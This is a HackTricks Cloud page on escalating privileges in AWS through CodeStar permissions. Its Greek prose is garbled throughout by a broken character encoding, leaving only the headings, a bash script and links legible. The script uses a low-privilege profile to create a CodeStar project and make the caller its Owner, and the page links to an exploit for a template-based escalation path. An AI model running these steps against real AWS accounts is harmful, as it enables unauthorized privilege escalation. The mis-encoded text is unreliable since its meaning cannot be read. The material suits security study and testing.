# AWS - Î•Î½Î¯ÏƒÏ‡Ï…ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿ Codestar

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± Ï‡Î¬ÎºÎµÏ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï…Ï€Î¿Î²Î¿Î»Î® PRs** ÏƒÏ„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ Ï„Î¿Ï… [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Codestar

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ codestar ÏƒÏ„Î¿:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `iam:PassRole`, `codestar:CreateProject`

ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î­Î½Î±Î½ ÏÏŒÎ»Î¿ IAM Ï„Î¿Ï… codestar** Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ **Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚** Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ **Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… cloudformation**. Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="iam-passrole-codestar-createproject.md" %}
[iam-passrole-codestar-createproject.md](iam-passrole-codestar-createproject.md)
{% endcontent-ref %}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ `codestar:CreateProject` Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î­ÏÎ³Î¿ codestar, ÎºÎ±Î¹ Ï„Î¿ `codestar:AssociateTeamMember` Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· IAM Ï„Î¿Î½ **Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·** ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… Î­ÏÎ³Î¿Ï… CodeStar, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Ï„Î¿Ï… Ï‡Î¿ÏÎ·Î³Î®ÏƒÎµÎ¹ Î¼Î¹Î± **Î½Î­Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î¼Îµ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î¬Î´ÎµÎ¹ÎµÏ‚**.
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
Î•Î¬Î½ ÎµÎ¯ÏƒÏ„Îµ Î®Î´Î· Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… Î­ÏÎ³Î¿Ï…, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `codestar:UpdateTeamMember` Î³Î¹Î± Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ ÏƒÎ±Ï‚ ÏƒÎµ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ `codestar:AssociateTeamMember`.

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Î´ÏÎ±ÏƒÎ·:** Î‘Î½ÏÏˆÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® codestar Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¿:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `codestar:CreateProjectFromTemplate`

1. **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎÎ­Î¿Ï… ÎˆÏÎ³Î¿Ï…:**
- Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± **`codestar:CreateProjectFromTemplate`** Î³Î¹Î± Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… Î­ÏÎ³Î¿Ï….
- ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÏ€Î¹Ï„Ï…Ï‡Î® Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±, Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Ï‡Î¿ÏÎ·Î³ÎµÎ¯Ï„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î³Î¹Î± Ï„Î¿ **`cloudformation:UpdateStack`**.
- Î‘Ï…Ï„Î® Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ ÎµÎ¹Î´Î¹ÎºÎ¬ Î­Î½Î± stack Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ IAM `CodeStarWorker-<Î³ÎµÎ½Î¹ÎºÏŒ ÏŒÎ½Î¿Î¼Î± Î­ÏÎ³Î¿Ï…>-CloudFormation`.

2. **Î•Î½Î·Î¼Î­ÏÏ‰ÏƒÎ· Ï„Î¿Ï… Î£Ï„ÏŒÏ‡Î¿Ï… Stack:**
- ÎœÎµ Ï„Î¹Ï‚ Ï‡Î¿ÏÎ·Î³Î·Î¸ÎµÎ¯ÏƒÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ CloudFormation, Ï€ÏÎ¿Ï‡Ï‰ÏÎ®ÏƒÏ„Îµ ÏƒÏ„Î·Î½ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· Ï„Î¿Ï… ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï… stack.
- Î¤Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… stack ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¸Î± ÏƒÏ…Î¼Î¼Î¿ÏÏ†ÏÎ½ÎµÏ„Î±Î¹ Î¼Îµ Î­Î½Î±Î½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î´ÏÎ¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï„ÏÏ€Î¿Ï…Ï‚:
- `awscodestar-<Î³ÎµÎ½Î¹ÎºÏŒ ÏŒÎ½Î¿Î¼Î± Î­ÏÎ³Î¿Ï…>-infrastructure`
- `awscodestar-<Î³ÎµÎ½Î¹ÎºÏŒ ÏŒÎ½Î¿Î¼Î± Î­ÏÎ³Î¿Ï…>-lambda`
- Î¤Î¿ Î±ÎºÏÎ¹Î²Î­Ï‚ ÏŒÎ½Î¿Î¼Î± ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï€ÏÏŒÏ„Ï…Ï€Î¿ (Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÏ„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ ÏƒÎµÎ½Î±ÏÎ¯Î¿Ï…).

3. **Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎºÎ±Î¹ Î†Î´ÎµÎ¹ÎµÏ‚:**
- ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ·, Î±Ï€Î¿ÎºÏ„Î¬Ï„Îµ Ï„Î¹Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿Î½ **ÏÏŒÎ»Î¿ IAM Ï„Î¿Ï… CloudFormation** Ï€Î¿Ï… ÏƒÏ…Î½Î´Î­ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿ stack.
- Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Î‘Ï…Ï„ÏŒ Î´ÎµÎ½ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± Ï€Î»Î®ÏÎµÎ¹Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î¹ÎºÎ­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚. Î•Î½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎºÎ±ÎºÎ¿Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î¿Î¹ Ï€ÏŒÏÎ¿Î¹ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ Î³Î¹Î± Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Î±Î½ÏÏˆÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½.

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î­ÏÎµÏ…Î½Î±: [https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/).\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÏƒÏ„Î¿ [https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py)

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Î´ÏÎ±ÏƒÎ·:** Î‘Î½ÏÏˆÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿ IAM Ï„Î¿Ï… cloudformation.
